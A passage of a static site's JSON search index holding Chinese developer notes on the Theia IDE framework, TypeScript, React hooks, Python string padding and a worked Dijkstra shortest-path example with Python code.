发布到官方的镜像仓库.","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-theia-question-Create-custom-expansion.html","loc":"/yq-doc-source-docs-front-end-frame-theia-question-Create-custom-expansion.html"},{"title":"依赖注入使用以及问题","text":"依赖注入, 现在使用是很普遍. 在 theia 中编写服务时, 解耦的角度也可以使用依赖注入 个人习惯将接口都定义在common: // 后端提供的服务 export const IUtilService = Symbol('IUtilService') export interface IUtilService extends RpcServer<IUtilClient>{ getHash(data: string): Promise<string> getRandomStr(): Promise<string> setClient(client: IUtilClient): void } 将服务定义为成员变量与构造函数参数的区别 当通过 @inject 属性注入时,如果直接定义为类成员变量, 在构造函数中访问该成员变量时,有可能仍未被初始化, 出现 undefined 而如果在构造函数参数中定义,则可以保证在构造函数体执行前被初始化 类成员变量会在调用构造函数之前声明,但不会提前初始化 构造函数参数会在调用构造函数时由注入器进行初始化 构造函数体内,参数的值已经被初始化,但成员变量可能还未被初始化 故还是使用构造函数参数接收注入的值好一些: constructor(@inject(Foo) private foo: Foo) { // foo 已被初始化 } 但是其实即使是在构造函数中注入, 也可视作成员变量, 不需要在构造函数的实现中, 手动赋值, 默认就可以 this 调用 贡献点使用 普通服务注入直接 @inject 服务名即可 贡献点是注入贡献点 ContributionProvider 名称加一个 @named(贡献点基类) : @inject(ContributionProvider) @named(IExampleContribute) // IExampleContribute 是贡献点接口 protected readonly exampleCs: ContributionProvider<IExampleContribute> 除了贡献点基类, 都是内置的: import {inject, injectable, named, postConstruct } from \"@theia/core/shared/inversify\"; import {ContributionProvider} from \"@theia/core\"; 记得在入口文件绑定: // 把贡献点接口绑定 bindContributionProvider(bind, IExampleContribute) // 每一个实现都正常绑定, 此处不能rebind, 不然会覆盖前面已绑定的贡献点 bind(A).toSelef().inSingleScope() bind(IExampleContribute).toService(A) 获取所有贡献点: this.exampleCs.getContributions() 只bind自己效果 在 Theia 框架中，如果你只使用 bind(A).toSelf().inSingletonScope() 将服务 A 绑定到自身并设置为单例作用域，通常不需要使用 bind(A).toService(A) bind(A).toSelf().inSingletonScope() 表示将服务 A 绑定到自身，并在单例作用域中创建实例。 这意味着每次请求服务 A 时，都会返回同一个实例。 bind(A).toService(A) 则是将服务 A 绑定到服务 A 的实现。 这在一些复杂的依赖注入场景中可能会用到，但在一般情况下并不是必需的。 因此，如果你只需要创建实例并在需要的地方进行注入， bind(A).toSelf().inSingletonScope() 就足够了，无需额外 bind(A).toService(A)","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-theia-question-Dependent-injection-and-problem.html","loc":"/yq-doc-source-docs-front-end-frame-theia-question-Dependent-injection-and-problem.html"},{"title":"前后端通信-前端调用后端服务","text":"前后端服务都将以 依赖注入 的形式定义. 此处将介绍, 使用RPC通信, 将后端的服务提供给前端调用. 用例, 在项目根的 package.json 定义了工作区: \"workspaces\": [ \"src/@ide/*\" ] 在 src/@ide/ 下新增一个拓展 you-watch : mkdir src/@ide/you-watch 工作区可以嵌套, 即可以在自定义的拓展下再定义工作区 此拓展名为 @ide/you-watch (拓展下的 package.json 定义): \"name\": \"@ide/you-watch\" 然后, 新建 backen 和 browser 目录, 并实现前后端相应功能, 大概目录结构: $ tree src -L 2 src ├── backend │ ├── index.ts │ ├── util-service.ts │ └── utils.ts ├── browser │ ├── index.ts │ ├── util-client.ts │ └── you-watch-contribution.ts └── common └── service.ts index 即默认入口文件 主要在于绑定, 后端的入口文件: // backend/index.ts import {ContainerModule} from '@theia/core/shared/inversify' import {IUtilService, IUtilClient, IUtilServicePath} from \"../common/service\"; import {UtilService} from \"./util-service\"; import {ConnectionHandler, RpcConnectionHandler} from \"@theia/core\"; export default new ContainerModule( (bind, unbind, isBound, rebind, unbindAsync, onActivation, onDeactivation) => { bind(IUtilService).to(UtilService).inSingletonScope() // 后端通信实现 bind(ConnectionHandler).toDynamicValue( ({container}) => new RpcConnectionHandler<IUtilClient>( IUtilServicePath, (client) => { const utilService: IUtilService = container.get(IUtilService) utilService.setClient(client) return utilService } ) ) } ) 这里使用rpc通信, IUtilClient 只是一由前端实现的通信中介, 前端可实现空: // browser/util-client.ts import {injectable} from \"@theia/core/shared/inversify\"; @injectable() export class UtilClient implements IUtilClient{ } 前端的绑定实现: // browser/index.ts /** * Generated using theia-extension-generator */ import {YouWatchCommandContribution, YouWatchMenuContribution} from \"./you-watch-contribution\"; import { CommandContribution, MenuContribution } from '@theia/core/lib/common'; import { ContainerModule } from '@theia/core/shared/inversify'; import {IUtilClient, IUtilService, IUtilServicePath} from \"../common/service\"; import {UtilClient} from \"./util-client\"; import {WebSocketConnectionProvider} from \"@theia/core/lib/browser\"; export default new ContainerModule(bind => { // add your contribution bindings here bind(CommandContribution).to(YouWatchCommandContribution).inSingletonScope() bind(MenuContribution).to(YouWatchMenuContribution).inSingletonScope() // 前端通信实现 bind(IUtilClient).to(UtilClient).inSingletonScope() bind(IUtilService).toDynamicValue( (context) => { const client = context.container.get<IUtilClient>(IUtilClient) const connection = context.container.get(WebSocketConnectionProvider) return connection.createProxy<IUtilService>( IUtilServicePath, client ) } ) }); 这里是关联到后端发布的rpc服务.","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-theia-question-Front-end-communication-front-end-call-back-end-service.html","loc":"/yq-doc-source-docs-front-end-frame-theia-question-Front-end-communication-front-end-call-back-end-service.html"},{"title":"引入自定义css文件","text":"在拓展根目录(src)下的 browser 下新建一个 style 文件夹, 其中新建自己的css, 如 my-style.css 如果没有定义前端服务, 直接在扩展的 package.json 中配置: \"theiaExtensions\": [ { \"frontend\": \"lib/browser/style/my-style.css\" } ] 如果有定义前端服务如 index.ts , 那么 package.json 中已经有: \"theiaExtensions\": [ { \"frontend\": \"lib/browser/index\" } ] 这个时候只需要简单的在 index.ts 导入即可: import '../../src/browser/style/my-style.css' 因为lib是编译的, 下面没有css, 所以得从根目录重新进 注解 如果是覆盖theia框架原有的, 不用导","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-theia-question-Introduce-custom-CSS-files.html","loc":"/yq-doc-source-docs-front-end-frame-theia-question-Introduce-custom-CSS-files.html"},{"title":"打开/切换编辑器","text":"使用 EditorManager , 位置: import {EditorManager} from \"@theia/editor/lib/browser\"; 需要知道当前URI, 然后调用 open import URI from '@theia/core/lib/common/uri' @inject(EditorManager) _editorManager: EditorManager const uri: URI this._editorManager.open(uri) 调用时候会自动判断存不存在, 若存在就切换过去 注解 吐槽下theia的某些内置的机制有点反人类, 啥都得重写一下, 才好用.","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-theia-question-Open-switch-editor.html","loc":"/yq-doc-source-docs-front-end-frame-theia-question-Open-switch-editor.html"},{"title":"打开目录/文件选择器","text":"使用内置 FileDialogService 的 showOpenDialog 即可: import {FileDialogService, OpenFileDialogProps} from '@theia/filesystem/lib/browser' import {FileService} from '@theia/filesystem/lib/browser/file-service' @inject(FileDialogService) protected readonly _fileDialogService: FileDialogService @inject(FileService) protected readonly _fileService: FileService async selectSomeFile(){ const selectOptions: OpenFileDialogProps = { title: '请选择文件', canSelectFiles: true, canSelectFolders: false, canSelectMany: false, // 若要自定义选择文件类型 filters: { 'static': ['css', 'js'], 'typeScript': ['ts', 'tsx'] } } const startPath = await this._fileService.resolve(URI.fromFilePath('/usr/local/xxx')) await this._fileDialogService.showOpenDialog( selectOptions, startPath ) }","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-theia-question-Open-the-directory-&-file-selector.html","loc":"/yq-doc-source-docs-front-end-frame-theia-question-Open-the-directory-&-file-selector.html"},{"title":"结合electron时候的报错","text":"报错 Module did not self-register: '.../node_modules/drivelist/build/Release/drivelist.node'. 参考: https://github.com/balena-io-modules/drivelist/issues/389#issuecomment-850784173 issues 上面看到的是: Install electron-rebuild run cd ./node_modules/drivelist && ../.bin/electron-rebuild rebuild 其实与下面的应该是一个问题(可能也要删除lib, 下次遇到再试试) 报错 Cannot find module '../build/Debug/pty.node' 参考: https://github.com/Microsoft/node-pty/issues/256#issuecomment-454292439 解决: npm install --save-dev electron-rebuild 然后在 package.json 的 scripts 增加: \"scripts\": { \"rebuild:node\": \"electron-rebuild -f -w node-pty\" } 删除项目根目录下 lib`(可不删除也行好像), 执行 ``npm run rebuild:node` 在重写编译一下, 比如我这里是 npm run prepare 即可: \"scripts\": { \"prepare\": \"yarn run clean && yarn build && yarn run download:plugins\", \"clean\": \"theia clean\", \"build\": \"theia rebuild:electron && theia build --mode development\", \"rebuild\": \"theia rebuild:electron --cacheRoot ./.theia_build/cache && theia build --mode development\", \"start\": \"theia start --plugins=local-dir:plugins --remote-debugging-port=9222\", \"download:plugins\": \"theia download:plugins\", \"rebuild:node\": \"electron-rebuild -f -w node-pty\" }","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-theia-question-Report-error-when-combining-Electron.html","loc":"/yq-doc-source-docs-front-end-frame-theia-question-Report-error-when-combining-Electron.html"},{"title":"自定义任意位置的鼠标右键上下文菜单","text":"说明: 即, 当鼠标右键单击时, 在单击的位置触发的菜单栏 (就像Win桌面鼠标右键触发的那玩意儿) 首先需要注册一个菜单指令(菜单的指令, 与实际的指令): /* 先注册一个自定义的菜单 */ namespace CustomContextMenuCommand { const category = 'custom-context-menu-command' export const HELLO_COMMAND = Command.toDefaultLocalizedCommand({ id: 'custom:command', category: category, label: 'hello command' }) } 将菜单与指令注册到贡献点: @injectable() export class CustomAContextMenu implements CommandContribution, MenuContribution{ constructor( @inject(MessageService) private readonly _messageService: MessageService, ) { } registerCommands(commands: CommandRegistry) { commands.registerCommand( CustomContextMenuCommand.HELLO_COMMAND, {execute: async (...args) => { await this._messageService.info('自定义上下文菜单 - 你瞅啥') }} ) } registerMenus(menus: MenuModelRegistry) { menus.registerMenuAction( [...NAVIGATOR_CONTEXT_MENU, '_1_hello'], // CommonMenus.EDIT_CONTEXT_MENU, { commandId: CustomContextMenuCommand.HELLO_COMMAND.id, label: CustomContextMenuCommand.HELLO_COMMAND.label, } ) } } 这里是注册到系统左侧的导航栏位置的文件资源管理器, 预定义的菜单名为 NAVIGATOR_CONTEXT_MENU , 要在这里触发, 直接放这里即可 效果: 如何手动使用代码触发? 注入render: // import {ContextMenuRenderer} from \"@theia/core/lib/browser\"; @inject(ContextMenuRenderer) readonly _contextMenuRender: ContextMenuRenderer, 调用打开: openMenu(e) { this._contextMenuRender.render({ menuPath: NAVIGATOR_CONTEXT_MENU, anchor: {x: e.clienX, y: e.clientY}, // 坐标位置 args: [], // 参数 }) } 这里的调用可以放到诸如div的右键事件去, 比如: <div class=\"container\" style=\"flex-direction: row;\" oncontextmenu={openMenu(this)}> </div>","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-theia-question-Right--click-on-the-mouse-of-any-location.html","loc":"/yq-doc-source-docs-front-end-frame-theia-question-Right--click-on-the-mouse-of-any-location.html"},{"title":"前后端路径传递URI/URL","text":"URI: 资源标识符 URL: 具体的URI,包含了网络协议信息,如http,https等 前后端通信传递资源路径时,通常都建议使用 URI 而不是 URL 主要原因有: URI表示资源标识符,只关注标识资源,而不限定使用的协议。这更通用。 URL是一种具体的URI,包含了网络协议信息,如http,https等。这对资源标识来说是非必需的。 前后端可以使用不同的协议访问同一个资源标识符,URI可以兼容。 URI有一个通用的语法格式,方便解析处理。并且可以包含非网络资源,如本地文件路径。 URL编码有些字符如空格等会被编码,而URI可以保留原始字符。 URI可以方便地映射到不同的具体URL,为应用带来更大灵活性。 许多程序库和框架也推荐使用URI格式表示资源标识符。 URI与URL的相互转换 注解 此处的URI为 vscode-uri 模块下的 URI theia框架的URI为 import URI from '@theia/core/lib/common/uri' URI字符串, scheme + path 的形式, 如: const uriStr = file:///c:/users/bob URL路径字符串, 如: const urlStr = /c:/users/bob 本地路径字符串, 纯路径如: const localPathStr = c:/users/bob URI字符串 ==> URI对象: const uriIns = URI.parse(uriStr) URI字符串 ==> URL对象: const urlIns = new URL(uriStr) // 如果要获取url字符串 const urlStr = urlIns.pathname URI对象转换为本地路径字符串, 比如theia框架有提供Path对象, 是对 import URI from 'vscode-uri' 进行的一个封装, 那么在theia中可以直接: const convertedStr = uriIns.path.fspath() 若非框架环境, 后面再说 URL字符串 ==> URI对象: const uriIns = URI.file(urlStr) // theia框架提供了 const uriIns = URI.fromFilePath(urlStr) 注解 有时候字符串可能是被URI编码了, 需要解码: // 两种好像都可以, 不记得了 decodeURIComponent(urlStr) decodeURIComponent(uriStr) 什么时候需要转换? 当URI字符串有问题的时候, 先生成个URL对象, 然后再转换为URI对象: // 有个有问题的URI字符串, 比如 file:/c:/users/bob const issuesUriStr = 'file:/c:/users/bob' const urlStr = decodeURIComponent((new URL(issuesUriStr)).pathname) const uriIns = URI.file(urlStr) theia不通过后端拼接路径 theia的URI封装的Path对象提供此功能: const _uriIns: URI const _baseName: string // 主要是这一步 _path: Path = _uriIns.path.join(_baseName) _newUriIns: URI = URI.fromFilePath(_path.fspath())","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-theia-question-The-front-and-rear-path-transmission-URI.html","loc":"/yq-doc-source-docs-front-end-frame-theia-question-The-front-and-rear-path-transmission-URI.html"},{"title":"theia启动白屏","text":"可以从官方仓库的提交记录中发现端倪: https://github.com/eclipse-theia/theia/commit/45a0953d7eed19cd311840281f17999d268ba7cf , 但, 其实对没有配置 preloadTemplate 的项目影响不大, 但是如果配置了, 那启动时, 会很早就打开一个初始化窗口, 且这个时候只能用给的默认的背景色, 不过可以通过配置 \"showWindowEarly\": false 来不启动这个早期窗口, 暂时这样解决吧: \"theia\": { \"target\": \"electron\", \"frontend\": { \"config\": { \"applicationName\": \"Theia Electron Example\", \"electron\": { \"showWindowEarly\": false } } }, \"generator\": { \"config\": { \"preloadTemplate\": \"./resources/preload.html\" } } },","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-theia-question-Theia-start-the-white-screen.html","loc":"/yq-doc-source-docs-front-end-frame-theia-question-Theia-start-the-white-screen.html"},{"title":"使用diff编辑器打开两个文件对比","text":"首先, 要有两个URI路径 (theia封装的URI: import URI from '@theia/core/lib/common/uri' ): import URI from '@theia/core/lib/common/uri' const leftUri = new URI('file:///c:/users/bob.txt') const rightUri = new URI('file:///c:/users/bob2.txt') 然后使用DiffUris封装这两个URI: import {DiffUris} from '@theia/core/lib/browser/diff-uris' const diffU: URI = DiffUris.encode(leftUri, rightUri) 然后在使用open打开: import {OpenerService, open} from '@theia/core/lib/browser' @inject(OpenerService) readonly _openerService: OpenerService open(this._openerService, diffU)","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-theia-question-Use-Diff-editor-to-open-two-file-comparison.html","loc":"/yq-doc-source-docs-front-end-frame-theia-question-Use-Diff-editor-to-open-two-file-comparison.html"},{"title":"theia使用外部浏览器打开链接","text":"使用内置的 OpenerService: import {OpenerService} from \"@theia/core/lib/browser\"; import {URI} from \"@theia/core\"; @inject(OpenerService) protected readonly _openService: OpenerService protected openExternalBrowser(link: string){ // 这里链接必须是 https://baidu.com/ 这种 const linkUri = new URI(link) this._openService.getOpener(linkUri).then( (opener) => { opener.open(linkUri) } ) }","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-theia-question-Use-the-external-browser-to-open-the-link.html","loc":"/yq-doc-source-docs-front-end-frame-theia-question-Use-the-external-browser-to-open-the-link.html"},{"title":"yarn install 出现node-gyp报错","text":"报错内容大致如下: xxxx/node_module/nsfw: Command failed. Exit code: 1 Command: node-gyp rebuild Arguments: 我用的是yarn, 试过直接: yarn global add node-gyp 失败 最终偶然发现: npm i -g node-gyp 解决了, 奇怪....","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-theia-question-Yarn-Install-appears-node-gyp-error.html","loc":"/yq-doc-source-docs-front-end-frame-theia-question-Yarn-Install-appears-node-gyp-error.html"},{"title":"导入json","text":"对于ts项目而言 在 tsconfig.json 增加以下内容: { \"compilerOptions\": { \"resolveJsonModule\": true } } 然后直接: import * as schemeData from 'xxxxx.json' 即可","tags":"前端","url":"/yq-doc-source-docs-front-end-question-Import-json.html","loc":"/yq-doc-source-docs-front-end-question-Import-json.html"},{"title":"ts的!与?","text":"表示变量可能为空. !用法 用在变量前表示取反 用在赋值的内容后时，使null和undefined类型可以赋值给其他类型并通过编译，表示该变量值可空 ?用法 可以表示可选参数 如: interface IDemo { x?: number } 可防御性编程: const a = fetch(...) || {} // 假设a是从后端拿到的一个对象类型数据 const unsafeData = a.b.c // 这样写时不安全的，无法确保b是否有值，如果为空则b.c会进行报错 const safeData = a?.b?.c // 实际上就是相当于 const safeData = a && a.b && a.b.c 其他见 /docs/前端/typescript/问号与叹号","tags":"前端","url":"/yq-doc-source-docs-front-end-question-TS's-exclamation-mark-and-question-mark.html","loc":"/yq-doc-source-docs-front-end-question-TS's-exclamation-mark-and-question-mark.html"},{"title":"字符串补0","text":"左对齐, 右侧补0: In [2]: \"123\".ljust(5, \"0\") Out[2]: '12300' 右对齐, 左侧补0: In [3]: \"123\".rjust(5, \"0\") Out[3]: '00123' 或者: In [4]: \"123\".zfill(5) Out[4]: '00123' 或者使用%: In [5]: \"%05d\" % 123 Out[5]: '00123'","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-conclusion-of-issue-String-supplement-0.html","loc":"/yq-doc-source-docs-rear-end-python-conclusion-of-issue-String-supplement-0.html"},{"title":"Dijkstra(迪杰斯特拉)算法","text":"Dijkstra 算法是一个基于「贪心」、「广度优先搜索」、「动态规划」求一个图中一个点到其他所有点的最短路径的算法，时间复杂度 O(n&#94;2) 典型最短路径算法 ，用于计算一个节点到其他节点的最短路径。 它的主要特点是以起始点为中心向外层层扩展(广度优先遍历思想)，直到扩展到终点为止。 基本步骤: Dijkstra 算法从指定的节点（源节点）出发，寻找它与图中所有其它节点之间的最短路径。 Dijkstra 算法会记录当前已知的最短路径，并在寻找到更短的路径时更新。 一旦找到源节点与其他节点之间的最短路径，那个节点会被标记为\"已访问\"并添加到路径中。 重复寻找过程，直到图中所有节点都已经添加到路径中。 这样，就可以得到从源节点出发访问所有其他节点的最短路径方案。 注解 Dijkstra 只能用在权重为正的图中，因为计算过程中需要将边的权重相加来寻找最短路径。 Dijkstra 算法示例 寻找 0 到其它每一个节点的最短路径. 注解 假定两个节点之间的权重表示它们之间的距离。 我们将会得到节点 0 到节点 1、节点 0 到节点 2、节点 0 到 节点 3……（以此类推）的最短路径。 初始的距离列表如下： 还有一个列表用来记录哪些节点未被访问（即尚未被包含在路径中） 注解 当所有节点都被添加到路径中时，算法的计算过程就完成了。 我们选择了从节点 0 出发，可以直接将它标记为\"已访问\"， 同样的，在未访问节点列表中把它划掉，并在图中给它加上红色的边框： 现在需要检查节点 0 到相邻节点的距离，两个相邻节点分别是节点 1 和节点 2（注意看红色的边）： 注解 这并不是说立即把这两个相邻节点加入到最短路径中。 在把一个节点加入到最短路径之前，需要确认是否已经寻找到了访问它的最短路径。 现在只是在对可选方案做初步检查。 更新节点 0 到节点 1、节点 0 到节点 2 的距离为它们之间的边的权重，分别为 2 和 6 更新了到相邻节点的距离之后： 根据已知的距离列表选择距离源节点最近的节点。 将它标记为\"已访问\"。 将它添加到路径中。 查看距离列表，发现节点 1 到源节点的距离是最短的（距离为 2），所以把它加入到路径中。 在图中，以红色边来表示： 在距离列表中用红色方块标记这个节点，表明它是\"已访问\"的、已经寻找到了访问这个节点的最短路径： 在未访问节点列表中将它划掉： 现在分析新的相邻节点，寻找访问它们的最短路径。 只需要分析已经在最短路径（标记为红色边）中的节点的相邻节点。 节点 2 和节点 3 都是最短路径包含的节点的相邻节点， 因为它们分别与节点 0 和节点 1 直接相连，如下图所示。下一步将要分析这两个节点。 之前已经计算过源节点到节点 2 的距离，并记录在了列表中， 所以不用更新。这次只需要更新源节点到新的相邻节点（节点 3）的距离： 这个距离是 7，来看看为什么。 为了计算源节点到另一个节点（这里指节点 3）的距离，需要把访问该节点的最短路径的所有边权重相加： 对于节点 3： 将构成路径 0 -> 1 -> 3 的所有边权重相加， 得到总距离为 7（0 -> 1 距离为 2，1 -> 3 距离为 5）。 现在得到了到相邻节点的距离，需要选择一个节点添加到路径中。 我们必须 选择一个已知到源节点距离最短的未访问节点 。 即选择 Distance 中未确定最小值. 从距离列表中可以看出，距离为 6 的节点 2 就是我们的选择： 在图中为它加上红色边框，并将路径上的边标记为红色： 在距离列表中用红色方块把它标记为\"已访问\"，在\"未访问\"节点列表中把它划掉： 重复前面的步骤，寻找源节点到新的相邻节点节点 3 的最短路径。 可以看到，有两种可选的路径： 0 -> 1 -> 3 或 0 -> 2 -> 3 。一起看看我们是如何确定最短路径的。 节点 3 在之前已经有了一个距离记录（距离为 7，参阅下表）， 这个距离是之前步骤中由路径 0 -> 1 -> 3 的两个边权重（分别为 5 和 2）相加得到的。 不过现在有了一个新的可选路径： 0 -> 2 -> 3 ，它途经权重分别为 6 和 8 的两条边 0 -> 2 和 2 -> 3 ，总距离为 14。 显然，第一个路径的距离更短（7 vs. 14）， 所以选择第一个路径 0 -> 1 -> 3 。只有在新的路径距离更短的情况下，才会更新距离列表。 因此，使用第一种方案 0 -> 1 -> 3 ，将节点添加到路径中。 把这个节点标记为\"已访问\"，在\"未访问\"节点列表中把它划掉： 重复前面的过程。 检查尚未访问的相邻节点：节点 4 和节点 5，因为它们是节点 3 的相邻节点。 更新它们到源节点的距离，尝试寻找更短的路径： 对于节点 4： 路径是 0 -> 1 -> 3 -> 4 ，距离为 17。 对于节点 5： 路径是 0 -> 1 -> 3 -> 5 ，距离为 22。 注解 我们只能从最短路径（红色边）上进行扩展， 而不能途经未被包含在最短路径中的边（例如，不能构造经过边 2 -> 3 的路径）。 现在需要选择将哪个未访问节点标记为\"已访问\"，这里选择节点 4，因为在距离列表中它的距离最短。在图中做标记： 在距离列表中用红色方块将它标记为\"已访问\"： 在\"未访问\"节点列表中把它划掉： 再次重复前面的过程。检查相邻节点：节点 5 和节点 6。分析每一种从已访问节点到它们之间的可能路径方案。 对于节点 5： 第一种选择是路径 0 -> 1 -> 3 -> 5 ，到源节点的距离为 22（2 + 5 + 15），前面的步骤已经记录了这个距离。 第二种选择是路径 0 -> 1 -> 3 -> 4 -> 5 ，到源节点的距离为 23（2 + 5 + 10 + 6）。 显然，第一个路径距离更短，为节点 5 选择第一种方案。 对于节点 6： 可选的路径是 0 -> 1 -> 3 -> 4 -> 6 ，到源节点的距离为 19（2 + 5 + 10 + 2）。 把距离最短（当前已知）的节点 6 标记为\"已访问\"。 在\"未访问\"节点列表中把它划掉： 现在得到了如下路径（标记为红色）： 现在只剩下一个节点 5 还没被访问了，看看我们要如何把它添加到路径中。 从已经添加到路径中的节点出发，有三种不同的路径可以访问节点 5： 第一种选择： 0 -> 1 -> 3 -> 5 ，总距离为 22（2 + 5 + 15）。 第二种选择： 0 -> 1 -> 3 -> 4 -> 5 ，总距离为 23（2 + 5 + 10 + 6）。 第三种选择： 0 -> 1 -> 3 -> 4 -> 6 -> 5 ，总距离为 25（2 + 5 + 10 + 2 + 6）。 选择总距离为 22 的最短路径： 0 -> 1 -> 3 -> 5 。 把这个节点标记为\"已访问\"，并在\"未访问\"节点列表中把它划掉： 瞧！ 我们得到了从节点 0 到图中每个节点的最短路径。 图中，标记为红色的边表示最短路径：连接节点 0 和目标节点的红色边即为从源节点出发访问目标节点的最短路径。 例如，想要从节点 0 出发访问节点 6，连接它们的红色边就是最短路径，跟着走就行了。 上述例子Python实现: from math import inf from typing import List class Solution: def find(self, n: int, edges: List[List[int]]) -> list: # 将 edges 转换为 图 g = [[inf] * n for _ in range(n)] for x, y, d in edges: g[x][y] = d g[y][x] = d # inf 当前已寻找好距离, # False 是否作为必须点被寻找 # 索引直接表示点 0 - n-1 dis = [(inf, False)] * n # 到自己的距离为0 dis[0] = (0, False) while any(not x[1] for x in dis): x = -1 cur_d = inf for i, (d, al_find) in enumerate(dis): # 找出当前 未访问 中最小的 if not al_find and d < cur_d: x = i cur_d = d # if x == -1: break # 最后一个点的时候, 肯定已经有其他点先遍历过了(双向点), 所以可以直接退出 if x == n-1: break # 标记为 当必经过当前点时 已找过 dis[x] = (dis[x][0], True) for y, d in enumerate(g[x]): if d == inf or dis[y][1]: continue # 不可达 或者 已经找过, 跳过 new_d = d + dis[x][0] if new_d < dis[y][0]: dis[y] = (new_d, False) return [x[0] for x in dis] if __name__ == '__main__': dd = Solution().find( 7, [ [0, 1, 2], [0, 2, 6], [1, 3, 5], [2, 3, 8], [3, 5, 15], [3, 4, 10], [4, 5, 6], [4, 6, 2], [5, 6, 6], ] ) print(dd) 参考:: 图文详解 Dijkstra 最短路径算法 https://www.cnblogs.com/goldsunshine/p/12978305.html , 这个还没仔细看, 浅浏览了感觉图比较全, 本地见: ../../../resources/pdf/一篇文章讲透Dijkstra最短路径算法 - 金色旭光 - 博客园.pdf","tags":"数据结构","url":"/yq-doc-source-docs-data-structure-Greedy-algorithm-Dijkstra-(Dijiestra)-algorithm.html","loc":"/yq-doc-source-docs-data-structure-Greedy-algorithm-Dijkstra-(Dijiestra)-algorithm.html"},{"title":"Component","text":"类组件定义必须继承其, 并至少实现启动的 render() 方法. 原型: React.Component<P, S> P 是 组件接受的类型, S 表示当前组件的 state 类型","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-react-API-Component.html","loc":"/yq-doc-source-docs-front-end-frame-react-API-Component.html"},{"title":"createRef","text":"与 函数组件 的 /docs/前端/框架/react/hooks/useRef 基本一致. 支持类组件和函数组件. 注解 准确的说, 仅支持类组件, 因为 createRef 在函数组件中 并没有 Hooks 的效果，其值会随着 FunctionComponent 重复执行而不断被初始化 为什么 createRef 可以在 ClassComponent 正常运行呢？ 这是因为 ClassComponent 分离了生命周期，使例如 componentDidMount 等初始化时机仅执行一次。 React的数据流是自上而下的, 意味着如果想要从父组件更新自组件, 只有更新 Props 再触发重新渲染. 而 Ref 可以创建一个子组件的引用, 给父组件直接调用. 注解 Props 是单向数据流，以 声明式 渲染组件；Ref 则是以 命令式 操作组件。 命令式: 打破了 Props 的单向数据流，直接操作子元素。 从 React16.3 开始, 官方提供了 createRef: class Parent extends React.Component { constructor(props) { super(props); this.myRef = React.createRef(); } componentDidMount() { const node = this.myRef.current; // 使用 ref 对象 } render() { return <div ref={this.myRef}>Ref Example</div>; } } ref可以直接指向定义的变量名, 但是使用的时候, 需要额外加个 current 才能获取当前引用实例. 重要 ref不能挂到一个函数式组件 重要 因为命令式破坏了原先的数据流，所以请不要滥用 Ref 可以使用 Props 完成的，建议优先使用声明式的Props。 例如：我们写一个\"对话框组件\"，最好使用 isOpen 属性控制开关，而不是暴露 close() 和 open() 方法。 注解 React 会在组件挂载时给 current 属性传入 DOM 元素， 并在组件卸载时传入 null 值。 ref 会在 componentDidMount 或 componentDidUpdate 生命周期钩子触发前更新。 这就是为什么ref.current总能拿到最新值的原因 不使用createRef ref需要手动赋值: class MyComponent extends React.Component { constructor(props) { super(props); this.myRef = null; } componentDidMount() { const node = this.myRef; // 使用 ref 对象 } render() { return <div ref={ref => (this.myRef = ref)}>Ref Example</div>; } } 效果感觉差不多.","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-react-hooks-Createe.html","loc":"/yq-doc-source-docs-front-end-frame-react-hooks-Createe.html"},{"title":"自定义Hook","text":"举个例子，我们写一个 hook 实时获取页面的宽度: // 创建一个名为useWidth的hook function useWidth () { // 1. 声明一个宽度的state const [width, setWidth] = useState(window.innerWidth); useEffect(() => { function handleResize() { // 2. 每当屏幕resize时，更新width setWidth(window.innerWidth); } // 3. 添加监听事件 window.addEventListener(\"resize\", handleResize); // 4. 返回一个移出事件的函数 return () => window.removeEventListener(\"resize\", handleResize); }, []); return width; } 使用: function App () { // 使用自定义hook const width = useWidth(); return <div>当前屏幕宽度为{width}</div> } 自定义的useWidth，实时获取屏幕宽度 另外，很重要的几点提示： hook在各个组件中的state状态是隔离的，这个跟js函数的概念是一致的； React Hooks不是用来在多组件中复用状态，而是在多组件中复用状态逻辑；","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-react-hooks-Custom-HOOK.html","loc":"/yq-doc-source-docs-front-end-frame-react-hooks-Custom-HOOK.html"},{"title":"useEffect","text":"为组件添加副作用的操作 比如，每次渲染之后，修改网站的标题: function Example() { const [count, setCount] = useState(0); useEffect(() => { document.title = `You clicked ${count} times`; }); } 觉得每次渲染都执行开销太大, 还可以仅在count更新的时候执行(使用第二个参数即可): useEffect(() => { document.title = `You clicked ${count} times`; }, [count]); 表示只有当count变化的时候，重新执行副作用 有时候我们会希望useEffect只在第一次渲染时候执行一次， 例如 componentDidMount ，第二个参数设置成空数组: useEffect(() => { console.log('组件Mounted'); }, []); 注解 可以使用多个 useEffect 作为不同的 hooks 让逻辑分离 如果需要消除 effect , 返回函数即可","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-react-hooks-useeffect.html","loc":"/yq-doc-source-docs-front-end-frame-react-hooks-useeffect.html"},{"title":"useState","text":"为组件添加 State 例子: import React, { useState } from 'react'; function Example() { // 声明一个state count const [count, setCount] = useState(0); // 使用count进行渲染，并绑定点击时间，使count+1 return ( <div> <p>You clicked {count} times</p> <button onClick={() => setCount(count + 1)}> Click me </button> </div> ); } 注解 当有多个state时，使用多个state变量，而不是一个, 这样把无关逻辑分离，便于增删改state","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-react-hooks-usestate.html","loc":"/yq-doc-source-docs-front-end-frame-react-hooks-usestate.html"},{"title":"ref类型不匹配","text":"大致报错信息: MutableRefObject<SelectComponent | undefined> is not assignable to type Ref<SelectComponent> | undefined 或者: Type ForwardedRef<unknown> is not assignable to type LegacyRef<SelectComponent> | undefined 原因: 在 React 中，ref 可以是两种类型之一：LegacyRef 或 MutableRefObject。 LegacyRef 是一个旧版本的 ref 类型，适用于类组件和函数组件。 